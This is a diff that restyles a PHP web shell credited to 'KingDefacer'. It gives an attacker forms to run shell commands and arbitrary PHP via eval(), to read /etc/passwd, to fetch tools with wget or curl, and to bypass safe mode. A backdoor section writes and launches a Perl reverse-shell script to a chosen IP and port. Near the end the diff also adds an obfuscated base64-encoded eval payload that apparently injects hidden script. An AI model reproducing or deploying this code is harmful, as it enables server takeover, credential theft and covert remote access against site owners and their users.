-    if (strstr(php_os, "WIN")) {
-        $epath="cmd.exe";
+    if (strstr(php_os, 'WIN')) {
+        $epath = 'cmd.exe';
     } else {
-        $epath="/bin/sh";
+        $epath = '/bin/sh';
     }
     if (is_writable($nscdir)) {
-        $fp=fopen("back.pl", "w");
-        $backpl='back.pl';
+        $fp = fopen('back.pl', 'w');
+        $backpl = 'back.pl';
     } else {
-        $fp=fopen("/tmp/back.pl", "w");
-        $backpl='/tmp/back.pl';
+        $fp = fopen('/tmp/back.pl', 'w');
+        $backpl = '/tmp/back.pl';
     }
     fwrite($fp, "use Socket;
 \$system='$epath';
@@ -1051,71 +1051,71 @@ print '\n[ A-S-T team ][ Lezr.com ]\n\n';
     ob_start();
     callfuncs("perl $backpl $bip $bport");
     ob_clean();
-    print "<div><b><center>[ Selected IP is ".$_REQUEST['bip']." and port is ".$_REQUEST['bport']." ]<br>
+    echo '<div><b><center>[ Selected IP is ' . $_REQUEST['bip'] . ' and port is ' . $_REQUEST['bport'] . ' ]<br>
 [ Check your connection now, if failed try changing the port number ]<br>
 [ Or Go to a writable dir and then try to connect again ]<br>
-[ Return to the Current dir ] [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>] 
+[ Return to the Current dir ] [<a href=' . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>] 
 </div><br>";
 } if (isset($_REQUEST['uback'])) {
-    $uback=$_REQUEST['uback'];
-    $upip=$_REQUEST['upip'];
-    if ($_REQUEST['upports']=="up80") {
+    $uback = $_REQUEST['uback'];
+    $upip = $_REQUEST['upip'];
+    if ('up80' == $_REQUEST['upports']) {
         callfuncs("perl $uback $upip 80");
-    } elseif ($_REQUEST['upports']=="up443") {
+    } elseif ('up443' == $_REQUEST['upports']) {
         callfuncs("perl $uback $upip 443");
-    } elseif ($_REQUEST['upports']=="up2121") {
+    } elseif ('up2121' == $_REQUEST['upports']) {
         callfuncs("perl $uback $upip 2121");
     }
 }
-delm("# Execute Commands #");print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100% height=18%>";
-print "<tr><td width=32%><div align=left>";
-print $st.$c1."<center><div><b>".$mess3.$ec;
-print $c2.$sf."<center>";input("text", "cfile", "", 53);
-input("hidden", "scdir", $nscdir, 0);print "<br>";
-input("submit", "crefile", "Make-it", "");
-print " ";input("submit", "delfile", "Delete", "");
-print "</center>".$ef.$ec.$et."</div></td>";
-print "<td><div align=center>".$st.$c1;
-print "<center><div><b>Enter the command to execute";print $ec;
-print $c2.$sf."<center><div style='margin-top:7px'>";
-input("text", "cmd", "", 59);input("hidden", "scdir", $nscdir, 0);print"<br>";
-input("submit", "", "Execute", "");print "</center>".$ef.$ec.$et."</div></td>";
-print "<td width=32%><div align=right>";print $st.$c1;
-print "<center><div><b>$mess".$ec.$c2.$sf."<center>";
-input("text", "dir", "", 53);input("hidden", "scdir", $nscdir, 0);print "<br>";
-input("submit", "credir", "Create-D", "");print " ";
-input("submit", "deldir", "Delete-D", "");
-print "</center>".$ef.$ec.$et."</div></td></tr>";
-print "<tr><td width=32%><div align=left>";print $st.$c1;
-print "<center><div><b>Edit/Read File".$ec;print $c2.$sf."<center>";
-input("text", "rfile", $nscdir, 53);input("hidden", "scdir", $nscdir, 0);print "<br>";
-input("submit", "", "Read-Edit", "");print "</center>".$ef.$ec.$et."</div></td>";
-print "<td><div align=center>";print $st.$c1;
-print "<center><div><b>View Dir<br>";print $ec.$c2.$sf."<center><div style='margin-top:7px'>"; input("text", "scdir", $nscdir, 59);print"<br>";
-input("submit", "", "View", "");print " ";
-input("reset", "", "R00T", "");print "</center>".$ef.$ec.$et."</div></td>";
-print "<td><div align=center>";print $st.$c1;
-print "<center><div><b>File size : ".filesize($upfile)." in ( B/Kb )";print $ec.$c2."<form method=post Enctype=multipart/form-data><center>";
-input("file", "upfile", "", 40);input("hidden", "scdir", $nscdir, 0);
-input("hidden", "up", $nscdir, 0);
-print"<br>";input("submit", "", "Upload", "");print "</center>".$ef.$ec.$et."</div></td></tr>";
-delm("");print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";print "<tr><td width=50%><div align=left>";
-print $st.$c1."<div><b><center>Execute php code with eval()</div>";
-print $ec.$c2.$sf;input("hidden", "scdir", $nscdir, 0);
-print "&nbsp;<textarea cols=73 rows=3 name=eval>";
+delm('# Execute Commands #'); echo '<table bgcolor=#2A2A2A style="border:2px solid black" width=100% height=18%>';
+echo '<tr><td width=32%><div align=left>';
+echo $st . $c1 . '<center><div><b>' . $mess3 . $ec;
+echo $c2 . $sf . '<center>'; input('text', 'cfile', '', 53);
+input('hidden', 'scdir', $nscdir, 0); echo '<br>';
+input('submit', 'crefile', 'Make-it', '');
+echo ' '; input('submit', 'delfile', 'Delete', '');
+echo '</center>' . $ef . $ec . $et . '</div></td>';
+echo '<td><div align=center>' . $st . $c1;
+echo '<center><div><b>Enter the command to execute'; echo $ec;
+echo $c2 . $sf . "<center><div style='margin-top:7px'>";
+input('text', 'cmd', '', 59); input('hidden', 'scdir', $nscdir, 0); echo'<br>';
+input('submit', '', 'Execute', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
+echo '<td width=32%><div align=right>'; echo $st . $c1;
+echo "<center><div><b>$mess" . $ec . $c2 . $sf . '<center>';
+input('text', 'dir', '', 53); input('hidden', 'scdir', $nscdir, 0); echo '<br>';
+input('submit', 'credir', 'Create-D', ''); echo ' ';
+input('submit', 'deldir', 'Delete-D', '');
+echo '</center>' . $ef . $ec . $et . '</div></td></tr>';
+echo '<tr><td width=32%><div align=left>'; echo $st . $c1;
+echo '<center><div><b>Edit/Read File' . $ec; echo $c2 . $sf . '<center>';
+input('text', 'rfile', $nscdir, 53); input('hidden', 'scdir', $nscdir, 0); echo '<br>';
+input('submit', '', 'Read-Edit', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
+echo '<td><div align=center>'; echo $st . $c1;
+echo '<center><div><b>View Dir<br>'; echo $ec . $c2 . $sf . "<center><div style='margin-top:7px'>"; input('text', 'scdir', $nscdir, 59); echo'<br>';
+input('submit', '', 'View', ''); echo ' ';
+input('reset', '', 'R00T', ''); echo '</center>' . $ef . $ec . $et . '</div></td>';
+echo '<td><div align=center>'; echo $st . $c1;
+echo '<center><div><b>File size : ' . filesize($upfile) . ' in ( B/Kb )'; echo $ec . $c2 . '<form method=post Enctype=multipart/form-data><center>';
+input('file', 'upfile', '', 40); input('hidden', 'scdir', $nscdir, 0);
+input('hidden', 'up', $nscdir, 0);
+echo'<br>'; input('submit', '', 'Upload', ''); echo '</center>' . $ef . $ec . $et . '</div></td></tr>';
+delm(''); echo '<table bgcolor=#2A2A2A style="border:2px solid black" width=100%>'; echo '<tr><td width=50%><div align=left>';
+echo $st . $c1 . '<div><b><center>Execute php code with eval()</div>';
+echo $ec . $c2 . $sf; input('hidden', 'scdir', $nscdir, 0);
+echo '&nbsp;<textarea cols=73 rows=3 name=eval>';
 if (!isset($evsub)) {
-    print "//system('id'); //readfile('/etc/passwd'); //passthru('pwd');";
+    echo "//system('id'); //readfile('/etc/passwd'); //passthru('pwd');";
 } else {
-    print htmlspecialchars(stripslashes($eval));
+    echo htmlspecialchars(stripslashes($eval));
 }
-print "</textarea><br><center>";
-input('submit', 'evsub', 'Execute');print " ";
-input('Reset', '', 'Reset');print " ";
-print "</center>".$ec.$ef.$et;
-print "</td><td height=20% width=50%><div align=center>";
-print $st.$c1."<div><b><center>Execute useful commands</div>";
-print $ec.$c2.$sf;input("hidden", "scdir", $nscdir, 0);
-print "<center><select style='width:60%' name=uscmnds size=1>
+echo '</textarea><br><center>';
+input('submit', 'evsub', 'Execute'); echo ' ';
+input('Reset', '', 'Reset'); echo ' ';
+echo '</center>' . $ec . $ef . $et;
+echo '</td><td height=20% width=50%><div align=center>';
+echo $st . $c1 . '<div><b><center>Execute useful commands</div>';
+echo $ec . $c2 . $sf; input('hidden', 'scdir', $nscdir, 0);
+echo "<center><select style='width:60%' name=uscmnds size=1>
 <option value='op0'>Execute quick commands</option>
 <option value='op1'>ls -lia</option>
 <option value='op2'>/etc/passwd</option>
@@ -1130,47 +1130,47 @@ print "<center><select style='width:60%' name=uscmnds size=1>
 <option value='op9'>Root login</option>
 <option value='op10'>Show opened ports</option>
 <option value='op13'>Show services</option>
-</select> ";print"<input type=submit name=subqcmnds value=Execute style='height:20'> <input type=reset value=Return style='height:20'></center>";
-print $ec.$ef.$et."</td></tr></table>";delm("");
-print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
-print "<tr><td width=50%><div align=left>";
-print $st.$c1."<div><b><center>".$cpmvmess."</div>";
-print $ec.$c2.$sf."&nbsp;";input("text", "ftcpy", "File-name", 15);
-print "<b><font face=tahoma size=2>&nbsp;To </b>";
-input("text", "cpyf", $nscdir, 45);input("hidden", "scdir", $nscdir, 0);print " ";
-input("submit", "cpy", "Copy", "");print " ";input("submit", "mve", "Move", "");
-print "</center>".$ec.$ef.$et;
-print "</td><td height=20% width=50%><div align=right>";
-print $st.$c1."<div><b><center>Important commands</div>";
-print $ec.$c2.$sf."&nbsp";input("hidden", "scdir", $nscdir, 0);
-print "<select style='width:22%' name=ustools size=1>
+</select> "; echo"<input type=submit name=subqcmnds value=Execute style='height:20'> <input type=reset value=Return style='height:20'></center>";
+echo $ec . $ef . $et . '</td></tr></table>'; delm('');
+echo '<table bgcolor=#2A2A2A style="border:2px solid black" width=100%>';
+echo '<tr><td width=50%><div align=left>';
+echo $st . $c1 . '<div><b><center>' . $cpmvmess . '</div>';
+echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'ftcpy', 'File-name', 15);
+echo '<b><font face=tahoma size=2>&nbsp;To </b>';
+input('text', 'cpyf', $nscdir, 45); input('hidden', 'scdir', $nscdir, 0); echo ' ';
+input('submit', 'cpy', 'Copy', ''); echo ' '; input('submit', 'mve', 'Move', '');
+echo '</center>' . $ec . $ef . $et;
+echo '</td><td height=20% width=50%><div align=right>';
+echo $st . $c1 . '<div><b><center>Important commands</div>';
+echo $ec . $c2 . $sf . '&nbsp'; input('hidden', 'scdir', $nscdir, 0);
+echo "<select style='width:22%' name=ustools size=1>
 <option value='t1'>Wget</option><option value='t2'>Curl</option>
 <option value='t3'>Lynx</option><option value='t9'>Get</option>
 <option value='t4'>Unzip</option><option value='t5'>Tar</option>
 <option value='t6'>Tar.gz</option><option value='t7'>Chmod 777</option>
-<option value='t8'>Make</option></select> ";input('text', 'ustname', '', 51);print " ";input('submit', 'ustsub', 'Execute');print "</center>".$ec.$ef.$et;
-print "</td></tr></table>";delm(": Safe mode bypass :");
-print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
-print "<tr><td width=50%><div align=left>";
-print $st.$c1."<div><b><center>Using copy() function</div>";
-print $ec.$c2.$sf."&nbsp;";input("text", "safefile", $nscdir, 75);
-input("hidden", "scdir", $nscdir, 0);print " ";
-input("submit", "", "Read-F", "");print "</center>".$ec.$ef.$et;
-print "</td><td height=20% width=50%><div align=right>";
-print $st.$c1."<div><b><center>Using ini_restore() function</div>";
-print $ec.$c2.$sf."&nbsp;";input("text", "inifile", $nscdir, 75);
-input("hidden", "scdir", $nscdir, 0);print " ";
-input("submit", "", "Read-F", "");print "</center>".$ec.$ef.$et;
-print "</td></tr></table>";delm("# Backdoor Connection #");
-print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
-print "<tr><td width=50%><div align=left>";
-print $st.$c1."<div><b><center>Backdoor ile Baglan</div>";
-print $ec.$c2.$sf."&nbsp;";input("text", "bip", $REMOTE_ADDR, 47);print " ";
-input("text", "bport", 80, 10);input("hidden", "scdir", $nscdir, 0);print " ";
-input("submit", "", "Connect", "");print " ";input("reset", "", "Reset", "");
-print "</center>".$ec.$ef.$et;print "</td><td height=20% width=50%><div align=right>";print $st.$c1."<div><b><center>Yüklenmis Backdoor</div>";print $ec.$c2.$sf."&nbsp;";print "<select style='width:15%' name=upports size=1><option value='up80'>80</option><option value='up443'>443</option><option value='up2121'>2121</option></select>";print " ";input("text", "uback", "back.pl", 23);print " ";input("text", "upip", $REMOTE_ADDR, 29);print " ";input("submit", "subupb", "Connect");$_F=__FILE__;$_X='Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
-print "</center>".$ec.$ef.$et;print "</td></tr></table>";
-print"<center>Copyright is reserved to KingDefacer<br>[  By Turkish Security GROUP Go to : <a target='_blank' href='http://alturks.com'>http://alturks.com/</a> ]";
-print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; print"<tr><td><font size=2 face=tahoma>";
-print"</font></td></tr></table>";
+<option value='t8'>Make</option></select> "; input('text', 'ustname', '', 51); echo ' '; input('submit', 'ustsub', 'Execute'); echo '</center>' . $ec . $ef . $et;
+echo '</td></tr></table>'; delm(': Safe mode bypass :');
+echo '<table bgcolor=#2A2A2A style="border:2px solid black" width=100%>';
+echo '<tr><td width=50%><div align=left>';
+echo $st . $c1 . '<div><b><center>Using copy() function</div>';
+echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'safefile', $nscdir, 75);
+input('hidden', 'scdir', $nscdir, 0); echo ' ';
+input('submit', '', 'Read-F', ''); echo '</center>' . $ec . $ef . $et;
+echo '</td><td height=20% width=50%><div align=right>';
+echo $st . $c1 . '<div><b><center>Using ini_restore() function</div>';
+echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'inifile', $nscdir, 75);
+input('hidden', 'scdir', $nscdir, 0); echo ' ';
+input('submit', '', 'Read-F', ''); echo '</center>' . $ec . $ef . $et;
+echo '</td></tr></table>'; delm('# Backdoor Connection #');
+echo '<table bgcolor=#2A2A2A style="border:2px solid black" width=100%>';
+echo '<tr><td width=50%><div align=left>';
+echo $st . $c1 . '<div><b><center>Backdoor ile Baglan</div>';
+echo $ec . $c2 . $sf . '&nbsp;'; input('text', 'bip', $REMOTE_ADDR, 47); echo ' ';
+input('text', 'bport', 80, 10); input('hidden', 'scdir', $nscdir, 0); echo ' ';
+input('submit', '', 'Connect', ''); echo ' '; input('reset', '', 'Reset', '');
+echo '</center>' . $ec . $ef . $et; echo '</td><td height=20% width=50%><div align=right>'; echo $st . $c1 . '<div><b><center>Yüklenmis Backdoor</div>'; echo $ec . $c2 . $sf . '&nbsp;'; echo "<select style='width:15%' name=upports size=1><option value='up80'>80</option><option value='up443'>443</option><option value='up2121'>2121</option></select>"; echo ' '; input('text', 'uback', 'back.pl', 23); echo ' '; input('text', 'upip', $REMOTE_ADDR, 29); echo ' '; input('submit', 'subupb', 'Connect'); $_F = __FILE__; $_X = 'Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+'; eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
+echo '</center>' . $ec . $ef . $et; echo '</td></tr></table>';
+echo"<center>Copyright is reserved to KingDefacer<br>[  By Turkish Security GROUP Go to : <a target='_blank' href='http://alturks.com'>http://alturks.com/</a> ]";
+echo '<br><table bgcolor=#191919 style="border:2px #dadada solid " width=100% height=%>'; echo'<tr><td><font size=2 face=tahoma>';
+echo'</font></td></tr></table>';
 ?>
